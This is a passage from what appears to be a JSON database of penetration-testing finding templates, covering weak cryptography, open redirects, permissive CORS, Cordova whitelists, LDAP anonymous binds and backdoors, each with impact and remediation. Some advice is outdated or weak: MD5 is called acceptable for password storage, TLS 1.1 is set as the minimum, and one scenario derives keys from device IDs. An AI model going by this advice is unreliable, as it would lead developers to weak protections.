mobile application) should be the primary control. If it is desirable to encrypt data sent inside the TLS connection (e.g. to protect against potential TLS vulnerabilities), then generate an asymmetric key pair on the server and include the public key in the application binary/package. When encrypting data to send to the server, generate a random AES key, encrypt data with it, encrypt the AES key using the public key and send the encrypted data and the encrypted AES key to the server. Attackers will be able to reverse engineer the binary and extract the public key; however, this key will not allow them to decrypt previously-encrypted data.\nScenario 2: The device needs to decrypt data that is encrypted by a server (non-DRM scenarios where only transport protection is needed). As discussed above, TLS should be the primary control. Additionally, if needed, have the application generate an asymmetric key pair when a user first authenticates, and provide the public key to the server. Then, when the server needs to encrypt data to send to a device, it would generate a random AES key, encrypt data with it, encrypt the AES key using the target device's public key, and send the encrypted data and the encrypted AES key to the device.\nScenario 3: The device needs to decrypt data that is encrypted by a server (DRM scenarios where the key also needs to be protected in memory while it is in use). In this case, consider using whitebox cryptography and harden the binary using a commercial tool to prevent code lifting attacks.\nScenario 4: The device needs to encrypt data to store locally and needs the ability to decrypt it later. In this case, generate a key using user input and/or device-specific values (e.g. device IDs) such that the key does not need to be stored anywhere and can be generated when needed. Then, harden the binary using a commercial tool to make it difficult for an attacker to reverse engineer the key generation logic.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":649,"plugin_id":null,"title":"Insecure Encryption Algorithm in Use (DES)","type":null,"description":"The application uses the Data Encryption Standard (DES) encryption algorithm, which is considered insecure (unless it is used as part of Triple-DES). The DES algorithm was developed in the 1970's when its 56-bit key length was considered sufficient to protect against brute-force attacks. However, 56-bit keys can be brute forced quickly today, and DES should no longer be used. Note that the Data Encryption Standard was withdrawn by NIST in 2005 (see http://www.nist.gov/itl/fips/060205_des.cfm).\n","poc":null,"impact":"Since DES keys can be brute-forced quickly (and in some cases broken faster through cryptanalytical attacks):\n--If DES is used to protect confidential information, an attacker who gains access to the encrypted data will be able to decrypt it.\n--If DES is used to generate message authentication codes (e.g. a CMAC), an attacker who sees a message and its CMAC will be able to generate arbitrary messages with valid message authentication codes.\n--If DES is used to generate pseudo-random numbers, then attackers may be able to predict the numbers depending on the pseudo-random number generator's construction.\n\n","remediation":"Use the Advanced Encryption Standard (AES) encryption algorithm instead of DES.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":650,"plugin_id":null,"title":"Insecure Hash Algorithm Used (MD5)","type":null,"description":"The application uses the MD5 hash algorithm, which is insecure for use as a modification detection code (MDC). An MDC is a cryptographic hash function used without a secret key. Generally speaking, a cryptographic hash function generates a fixed-length representation of an arbitrary-length message that has the following properties:\n-- Given a hash, it is difficult to find an input that generates that hash when passed through the hash function (unless the hash is of a predictable input).\n-- It is infeasible to find two distinct inputs that have the same hash.\nIf MD5 is used as an MDC, then an attacker may be able to generate multiple pieces of data that have the same hash. Therefore, the hash cannot be used as a reliable representative for a piece of data. Some specific attacks that have been demonstrated are:\n--Generating two distinct PostScript files with the same MD5 hash\n--Generating two distinct X509v3 certificates with identical thumbprints - so that the certificate authority's signature on one of the certificates could be used with the other certificate\n--Generating two distinct executables with the same MD5 hash\n\nNote that for now, MD5 may still be acceptable for use in Message Authentication Codes (MACs) and for password storage; however, it is still advisable to use a cryptographically secure hash function for these purposes.","poc":"","impact":"","remediation":"Employ one of the SHA-2 or SHA-3 cryptographic hash functions whenever it is important that an attacker not be able to generate multiple pieces of data that have the same hash.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2019-01-16 07:07:00","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":"","likelihood_text":""},{"id":651,"plugin_id":null,"title":"Insecure Hash Algorithm Used (SHA1)","type":null,"description":"The application uses the SHA-1 hash algorithm. It is widely expected that we will start seeing practical attacks against SHA-1 around the 2018-2021 timeframe. As of August 5, 2015, NIST (http://csrc.nist.gov/groups/ST/hash/policy.html) has recommended:\n\"Federal agencies should stop using SHA-1 for generating digital signatures, generating time stamps and for other applications that require collision resistance\"\nSHA-1 will soon become insecure for use as a modification detection code (MDC). An MDC is a cryptographic hash function that does not use a secret key. Generally speaking, a cryptographic hash function generates a fixed-length representation of an arbitrary-length message that has the following properties:\n--Given a hash, it is difficult to find an input that generates that hash when passed through the hash function (unless the hash is of a predictable input)\n--It is infeasible to find two distinct inputs that have the same hash\n\n","poc":null,"impact":"If SHA-1 is used as an MDC, then in a few years, an attacker may be able to generate multiple pieces of data that have the same hash. At that point, a SHA-1 hash will no longer be a reliable representative for a piece of data. The exact consequence will depend on what the SHA-1 hash is used for. Note that SHA-1 will likely still be acceptable for use in secure Message Authentication Code (MAC) constructions (e.g. HMAC) and for password storage; however, it is still advisable to use a cryptographically secure hash function for this purpose.\n","remediation":"Employ one of the SHA-2 or SHA-3 cryptographic hash functions whenever it is important that an attacker not be able to generate multiple pieces of data that have the same hash. Even though no practical attack against SHA-1 exists yet, it is advisable to stop using it wherever possible to avoid future problems.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":652,"plugin_id":null,"title":"Insecure Pseudo-Random Number Generator Used","type":null,"description":"The application uses a cryptographically insecure pseudo-random number generator (PRNG). The outputs it generates are potentially predictable. A PRNG is a deterministic algorithm that takes an unpredictable seed as input and generates a stream of output that appears random. There are two popular types of PRNGs: PRNGs that produce outputs that are statistically random, and Cryptographically Secure PRNGs (CSPRNGs) that produce outputs that are suitable for cryptographic purposes. Loosely speaking, PRNGs generate outputs that do not contain any recognizable patterns; however, given a small amount of output from the PRNG, the past and/or future outputs may be computable. CSPRNGs on the other hand remain unpredictable as long as the seed used to initialize the CSPRNG is unknown.\n","poc":null,"impact":"An attacker who sees a small amount of output from a PRNG that is not cryptographically secure may be able to predict all past and/or future outputs from the PRNG. Using the PRNG outputs to generate values that are meant to be unpredictable (e.g. cryptographic keys, passwords, etc.) is insecure because the attacker will be able to guess these values and potentially gain unauthorized access to data or functionality.\n","remediation":"Use a CSPRNG with an unpredictable seed to ensure that the random values needed by the application cannot be predicted by an attacker. Some standardized CSPRNGs are described in NIST SP 800-90A, and ANSI X8.82 Part 3. See NIST SP 800-90B for guidance on entropy sources for seed generation.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":653,"plugin_id":null,"title":"Outdated Version of SSL TLS in Use in Mobile Client-side Code","type":null,"description":"The app does not disable the use of outdated versions of SSL/TLS cryptographic protocols to protect data in transit. Outdated versions of SSL/TLS contain publicly known vulnerabilities that could be used to read or modify sensitive data in transit.\n","poc":null,"impact":"When using an older version of SSL/TLS sensitive data in transit can potentially be read or modified by attackers. Significant attacks against older versions have been published. RFC7457 summarizes known attacks against SSL/TLS up to February 2015.\n","remediation":"Configure the app to only support TLS v1.1 or newer for outbound connections to servers.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":654,"plugin_id":null,"title":"PhoneGap or Cordova Access Origin is Set Too Broadly","type":null,"description":"The application's Apache Cordova domain whitelist is set too permissively, which allows content from unauthorized sites to be opened in the application's main WebView. As a result, arbitrary JavaScript code embedded in pages served from unauthorized sites will execute in the application's context. These scripts will be able to access any functionality provided by enabled plugins, which may include native device functionality or other sensitive functionality.\n","poc":null,"impact":"An attacker that can cause the app to load content from a malicious site into the main WebView will be able to execute arbitrary JavaScript code within the context of the vulnerable app. The code will be able to invoke standard JavaScript APIs as well as any functionality exposed by enabled plugins. Additionally, since the user does not usually see the URL of the loaded page in Cordova/PhoneGap apps, this configuration can be used to conduct phishing attacks.\n","remediation":"Applications should be configured to communicate only with a list of predetermined, authorized hosts. This is accomplished by configuring the access origin so that the main WebView can only load content from authorized sites. The following link provides details regarding access origin configuration:\nhttps://cordova.apache.org/docs/en/latest/guide/appdev/whitelist/index.html\nSome web analytics sites may need to be added if they are being used by the application; however, note that trusting third party sites does introduce risks into your application.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":655,"plugin_id":null,"title":"Open URL Redirect","type":null,"description":"Open URL redirection exists when the application redirects the user's browser to a URL that was constructed using untrusted data. In the simplest example, consider an application page which takes a URL from a query string parameter supplied by the user:\n<pre>http://www.site.com/Redirect.aspx?next_page=http%3a%2f%2fwww.site.com%2fHome.aspx </pre>\nWhen a user navigates to this page, the value of the parameter \"next_page\" is sent to the server. The application takes the value of this parameter, and issues an HTTP 302 response back to the user's browser which redirects them to the requested site:\n<pre>HTTP/1.1 302 Found ... Location: http://www.site.com/Home.aspx </pre>\nThe application will issue the redirect to any URL, since there are no controls in place to limit where the application sends the user.\n","poc":null,"impact":"Open URL redirection allows an attacker to redirect a victim to a site under the attacker's control. Since this site is fully under the attacker's control, the attacker may use it to perform any number of malicious actions. The attacker may use this site to execute scripts that attempt to install malware on the victim's system. The attacker may also display a page to the victim which is designed to look the same as the legitimate application, prompting the user to re-enter their credentials or other sensitive information, which are then sent back to the attacker.\n","remediation":"URLs constructed using untrusted data should be validated against a domain whitelist prior to redirect; when unvalidated redirects are required by the business, the application should request the user's permission prior to issuing the redirect.\nWhen possible, the URL used to issue a redirect should not come from the client. If a redirect can be issued to one of a set of known URLs, a token representing the URL should be passed to the client and then matched against the corresponding URL on the server during the initial redirect request rather than passing the entire URL from the client.\nIf building a complete list of valid URLs is infeasible, the application should maintain a whitelist of safe domains on the server, and only accept local paths to pages or resources which it then appends to the domain in server-side logic. For example, an application may only want to redirect users within the domain \"http://myhost.com\". To prevent the redirect URL from exposing users to potentially unsafe sites, the application should only accept local paths (e.g. \"/app1/index.jsp\") from the user. The application logic should then be responsible for validating the data and constructing the redirect URL by combining the whitelisted domain with the user-provided path.\nIf the application must provide an open redirect function and cannot make any assumptions about the redirect destination URL, then the application should display an intermediate page that asks the user for confirmation prior to redirect.\n","cvss_base_score":5.8,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:P/E:H/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":656,"plugin_id":null,"title":"RSA Used with No Padding","type":null,"description":"The application uses the RSA encryption algorithm with no padding (often referred to as \"textbook\" RSA). There are several problems with textbook RSA, including:\n--Textbook RSA is malleable: An attacker can modify the ciphertext in such a way that the underlying message is changed while the recipient has no way of detecting that the plaintext has been tampered with.\n--Textbook RSA is deterministic: Every time a given plaintext is encrypted, the ciphertext is the same.\n--If a short plaintext is encrypted, it may be possible to decrypt it without knowing the private key.\n\n","poc":null,"impact":"Depending on the plaintext, it may be possible for an attacker to determine the plaintext when given the ciphertext, or to intelligently change the recovered plaintext by changing the ciphertext.\n","remediation":"Always use RSA encryption with Optimal Asymmetric Encryption Padding (OAEP) as defined in PKCS #1 v2.0.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":657,"plugin_id":null,"title":"Sensitive Data Protected Using Base64","type":null,"description":"The application encodes sensitive data using the Base64 encoding algorithm, which does not offer any level of secrecy. Base64 simply translates binary data into an ASCII representation that contains 64 possible characters (plus one for padding). Each character of Base64-encoded data represents 6 bits of binary data, and the conversion algorithm is publicly known. Occasionally, developers assume that the Base64 algorithm provides some type of encryption. Since Base64 only encodes data, it does not provide a confidentiality/security control.\n","poc":null,"impact":"Any party that has access to Base64-encoded data will be able to decode it back to the original form.  Base64 does not provide a confidentiality control, thus if the encoded data is of a sensitive nature, it is not protected from viewing by any party.\n","remediation":"If the data being Base64-encoded must remain confidential, an encryption algorithm must be used instead. The output of the encryption algorithm can be Base64-encoded if needed. One option that will work in many cases is the AES encryption algorithm in GCM mode with a randomly generated (for each message) initialization vector. Consult a security expert to determine what the right solution for the application is (asymmetric key vs symmetric key cryptography), whether encryption or a message integrity control is required, how to manage/exchange keys, etc.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":658,"plugin_id":null,"title":"Vulnerable Cordova or PhoneGap Framework Version in Use","type":null,"description":"The application includes a known-vulnerable version of Cordova or a Cordova-derived framework. Apache Cordova allows developers to build cross-platform mobile applications using CSS, HTML5 and JavaScript instead of relying on platform-specific APIs. Note that several other cross-platform frameworks including PhoneGap, Ionic, Monaca, TACO, Intel XDK, Telerik Platform, etc. are based on Cordova.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in Cordova vary depending on the version of the software deployed. Known vulnerabilities in Cordova focus primarily on flaws in domain whitelisting, allowing attackers to bypass domain whitelists and load malicious pages and scripts in the application's context.\nFor the latest list of CVE's open against Cordova, select the deployed version of the appropriate software from the version list on the following pages:\n--https://www.cvedetails.com/version-list/45/27153/1/Apache-Cordova.html (Cordova)\n--https://www.cvedetails.com/version-list/53/27154/1/Adobe-Phonegap.html (PhoneGap)\n--http://www.cvedetails.com/version-list/14735/30043/1/Drifty-Ionic-View.html (Ionic)\n\n","remediation":"Update the application to use the latest available version of Cordova/PhoneGap.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":659,"plugin_id":null,"title":"Vulnerable Minimum OS Version Supported","type":null,"description":"The application indicates that it supports an operating system (OS) version that contains high-risk, publicly known vulnerabilities.\n","poc":null,"impact":"Applications that support known vulnerable OS versions are more likely to be using vulnerable versions of system libraries/APIs, leaving the application vulnerable to publicly known attacks. Readily available proof-of-concept code often exists for publicly known vulnerabilities, either by itself or as part of openly available testing tools. An attacker can leverage this code to exploit vulnerabilities more quickly since little or no time must be spent developing a working exploit.\nAn attacker may be able to exploit known vulnerabilities to attack functionality and APIs that the application relies on, the application directly, the user's data, and the device in general. The impact depends on the exact vulnerabilities present in the OS version(s) supported by the app, and may include information disclosure, loss of data integrity, remote code execution, etc.\n","remediation":"Drop support for OS versions that contain high risk, publicly known vulnerabilities. Note that this will result in some users being unable to install the newer version of the app. Unless this is done carefully, these users will not only end up using an older, vulnerable version of the OS, but potentially also an older, vulnerable version of the app.\nThe following steps outline one way to avoid this scenario while still dropping support for vulnerable OS versions:\n--Publish a new version of the app that checks the OS version and displays a warning indicating something like \"This application includes functionality that requires a newer OS version. Please upgrade to the latest OS version to continue using the full functionality of the application. After [date], this app will no longer be usable on this OS version.\" This might be a problem on Android where many devices may not be supported by the manufacturer anymore. Therefore, dropping support for older OS versions and preventing some percentage of users from using the application will need to be a business decision. If the app does not already send its version number to the server during sensitive operations (e.g. in user authentication requests), add this functionality.\n--Publish a new version of the app that does not support the old vulnerable OS version. Users that have not upgraded their OS by this point will not be able to download this update.\n--On the server, when requests for sensitive operations come in from the old version of the app, return an error message indicating that the user needs to upgrade the app to the latest version in order to use the functionality.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":660,"plugin_id":null,"title":"Unmasked Password","type":null,"description":"The application does not mask a password as the user enters the characters in the password field. The application does not define the field where users input their passwords as a \"password\" field, but instead as a normal \"text\" input field. Therefore, the browser displays the password on the page in plain text, which makes it possible to steal the password via a shoulder-surfing attack.\n","poc":null,"impact":"An attacker can shoulder surf a victim and capture the victim's password, then use it to authenticate as the victim and execute any actions the user is entitled to perform.\n","remediation":"The application should mask passwords in the UI when they are entered into the application. To mask the passwords, set the 'type' attribute to \"password\" for the input field.\n<pre><input type=\"password\" name=\"pwd\"> </pre>\n","cvss_base_score":6.8,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:S/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":661,"plugin_id":null,"title":"Overly Permissive CORS Allow Origin Policy","type":null,"description":"The application is configured with an overly permissive Cross-Origin Resource Sharing (CORS) policy that exposes application resources to untrusted origins. CORS defines whether JavaScript on one origin can interact with another origin using the XMLHttpRequest or Fetch APIs. The CORS policy relaxes the Same Origin Policy, an important security control that isolates potentially malicious resources to their respective origin.\nIf a script attempts to violate the Same Origin Policy by interacting with another origin, modern browsers will check a server's CORS policy by issuing a \"pre-flight request\", assuming that the request is not considered a \"simple request\". The browser allows the interaction only if the server responds with an Access-Control-Allow-Origin header that lists the script's origin or a wildcard match (*). A wildcard match allows interaction from any other origin, which allows malicious JavaScript on a different origin to make an HTTP request and read the HTTP response from the target origin.\nConsider the following example where foo.evil.com sends a request to bar.example.com:\n<pre>\nGET /CORScheck/ HTTP/1.1\n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML,\n\nlike Gecko) Version/12.0 Safari/605.1.15\n\nAccept: application/json, text/plain, */*\n\nReferer: http://foo.synopsys.com/\n\nOrigin: http://foo.synopsys.com/\n</pre>\nThe Origin header is checked against the same-origin policy at bar.example.com to see if it will respond. In the response from bar.example.com we see the the Access-Control-Allow-Origin is set to \"*\" indicating that all client origins are allowed.\n<pre>\nHTTP/1.1 200 OK\n\nContent-Type: application/json;charset=UTF-8\nDate: Fri, 28 Sep 2018 10:36:00 GMT\n\nContent-Length: 35\n\nConnection: keep-alive\n\nAccess-Control-Allow-Origin: *\n</pre>","poc":"","impact":"An attacker can place malicious JavaScript on their origin that can exploit the overly permissive CORS policy to access sensitive data on the target server or perform sensitive operations without the user's knowledge if the CORS policy allows for credentialed requests. For example, JavaScript executing in an untrusted origin, such as evil.com, can initiate an HTTP request to the target origin, such as example.org, and read the HTTP response. Depending on how the web service was designed this may allow an attacker to perform operations on behalf of an authenticated victim. This is especially possible if the target application supports credentialed requests, which can be configured via the Access-Control-Allow-Credentials HTTP response header.","remediation":"The Access-Control-Allow-Origin HTTP response header should not be set to a wildcard match or dynamically populated based on the Origin HTTP request header without input validation. In most cases, this header can be safely removed. However, if the application requires a relaxation of the Same Origin Policy, the application should whitelist origins that are trusted by this server.","cvss_base_score":4.9,"cvss_temporal_score":3.6,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:P/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2019-02-15 18:24:06","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":"","likelihood_text":""},{"id":662,"plugin_id":null,"title":"Anonymous Authentication in LDAP","type":null,"description":"The application uses anonymous connections to LDAP for read and/or write operations. In LDAP, authentication is supplied in the Bind operation. LDAPv3 supports both simple and SASL certificate-based authentication. A client that sends a simple credential-based Bind request without a username/password combination is treated as an anonymous client. In this design, the server cannot verify the client's identity and allows the client to read and write any data available to unauthenticated clients.\n","poc":null,"impact":"An attacker may exploit anonymous LDAP authentication to access, modify or delete data from an LDAP server. The impact of such access is limited only to the type of data stored on the LDAP server, and the systems that use that LDAP data to make various decisions (e.g. authentication, authorization, etc.). Sensitive information including user account details, entitlements and credentials may be exposed, allowing an attacker to impersonate another user, elevate their own privileges, or obtain sensitive information from other users' records. An attacker with write access may also exploit anonymous LDAP authentication to modify or delete other users' records, causing a loss of data integrity and/or potential denial of service conditions.\n","remediation":"Connect to LDAP via Simple authentication using credentials or via SASL mode (if LDAPv3). Anonymous binding can completely be disabled by configuring slapd.conf file in the LDAP installation.\n","cvss_base_score":6.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":663,"plugin_id":null,"title":"Improper Resource Shutdown or Release","type":null,"description":"The application does not release or incorrectly releases a resource that it previously opened. Resources include file handles, input streams, network streams and connection objects that are shared between threads and requests. Resources are said to be improperly shut down when all potential paths of expiration or invalidation are not accounted for. For example, consider an application that opens a database connection, executes queries, and then closes the connection in a single try {} block. In this design, the application does not account for the case where an exception is caught and program execution jumps to the corresponding catch {} block before the database connection is closed. In this situation, the connection or resource remains open and is not returned to the connection pool.\n","poc":null,"impact":"An attacker may create a denial of service condition by depleting the resource's connection pool if they are able to repeatedly trigger a resource leak (such as opening a large number of database connections). In some cases, if resources are not shut down correctly, sensitive data may also be exposed via subsequent connections.\n","remediation":"The application must shut down or close any opened resource (such as a database connection or input/output stream) after it is finished using that resource. The implementation should account for all possible execution paths where use of a resource ceases. For example, closing connections in finally {} blocks in Java code, which execute in both normal cases as well as exception states.\n","cvss_base_score":6.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:M/C:P/I:N/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":664,"plugin_id":null,"title":"Authentication by Hostname","type":null,"description":"The application authenticates users based on their client hostname, an unreliable factor of authentication. The hostname is obtained by performing reverse DNS resolution on the client's IP address. This reliance on DNS creates an attack vector, as attackers can alter the value of the hostname by spoofing DNS records. This can be done in a variety of ways including DNS cache poisoning, as well as through the compromise of a domain's authoritative DNS server(s) or domain registration. In addition, hostnames and IPs are not mapped one-to-one. Multiple IP addresses may correspond to the same host (e.g. simple load balancing, multi-homing), and hosts may have multiple aliases registered under one IP address. Since DNS names can be easily spoofed or misreported, despite countermeasures placed in the code it is impossible for source code to detect if a trusted DNS has been compromised and the client's supplied hostname is legitimate.\n","poc":null,"impact":"Authenticating users solely based on their client hostname can lead to authentication bypass. An attacker who is able to spoof a client's hostname will be able to impersonate that user, gaining access to all of the victim account's functionality and data.\n","remediation":"The application should not use hostnames to authenticate users; instead, other authentication mechanisms such as username-password, certificate authentication or multi-factor authentication should be used.\n","cvss_base_score":6.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":665,"plugin_id":null,"title":"Unreachable, Unused or Dead Code","type":null,"description":"The application contains dead or unreachable code. While both terms refer to code that is not used by the application, the two differ slightly. Unreachable code is code that will never execute because no control flow path in the application's source leads to it. Application code may be unreachable for a variety of reasons. For example, a bug in the application's implementation may prevent necessary functionality from executing, or the code exists in methods and classes that are never called or instantiated. Conversely, dead code is a part of the application's source that is executed, but whose results have no impact on application behavior or output (e.g. calculations whose result is never used).\n","poc":null,"impact":"Code rendered unreachable due to implementation bugs will not execute, causing unexpected application behavior and output. An example of such a case is Apple's SSL/TLS (or \"Goto fail\") bug (CVE-2014-1266). In the affected code, two subsequent \"Goto Fail\" statements block the control path from reaching a critical piece of code. As a result, all signature verifications are reported as successful, even if they actually fail.\nIn addition to unpredictable behavior, unreachable code also occupies unnecessary memory and may waste development time as it increases code complexity. This is true whether the unreachable code was intended to run or not.\nDead code presents a risk since it may raise exceptions that interrupt or alter program execution. For example, a calculation whose result is never used may still cause an exception in certain circumstances, such as a divide-by-zero condition. Dead code may also inadvertently affect program execution and output, introducing bugs when it is removed. In the divide-by-zero example, any code that appears after the calculation is not executed when a divide-by-zero condition occurs. By removing the dead code, any code that appears after that calculation will now execute since the potential for exception has been removed.\n","remediation":"Unreachable and dead code should be analyzed and either removed or corrected depending on whether it is needed. If the code should execute but doesn't, any bugs preventing the code from executing must be fixed. If the code is not needed, and its removal will not have a negative impact on the application, it should be removed.\n","cvss_base_score":3.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":666,"plugin_id":null,"title":"Unencrypted Viewstate","type":null,"description":"This vulnerability exists when sensitive data is stored in the VIEWSTATE and not encrypted, allowing unauthorized reading of the sensitive data. The VIEWSTATE field is base64 encoded making it easy to read the contents of the VIEWSTATE. When sensitive data is stored in the VIEWSTATE and that data should only be readable by the application server, the VIEWSTATE data should be encrypted.\n","poc":null,"impact":"Unencrypted sensitive data in the VIEWSTATE field results in an attacker being able to read that sensitive data. Non-sensitive data stored in the VIEWSTATE might be viewed as a type of information leakage as the attacker can use the data to understand how the application works and then launch attacks against the application.\n","remediation":"Set the ViewStateEncryptionMode property to Always or Auto either on the ASP page or in the code behind. If your application uses a web farm where a user's session might switch from one server to another, you must also manually configure the key to be used for encryption/decryption in each server of the web farm.\nBecause cryptography is being used there a number of security concerns that must be addressed including: choice of cryptographic algorithm, key rotation, key strength, and other key management concerns. However, a discussion of these concerns is out of scope for this report.\n","cvss_base_score":2.1,"cvss_temporal_score":1.7,"cvss_vector":"(AV:N/AC:H/Au:S/C:N/I:P/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":667,"plugin_id":null,"title":"Documented Backdoors","type":null,"description":"The application contains a backdoor, or code that allows users to bypass the normal authentication mechanism. A documented backdoor is a part of an application that is placed in the source code intentionally or unintentionally and is responsible for creating unwanted entry points into the application.\nBackdoors may appear in production systems by accident; for example, through test code that is not removed before the application is pushed to production. Backdoors may also appear in production systems on purpose, either for benign or malicious purposes. For example, an application may ship with default credentials that are not disabled when the application is 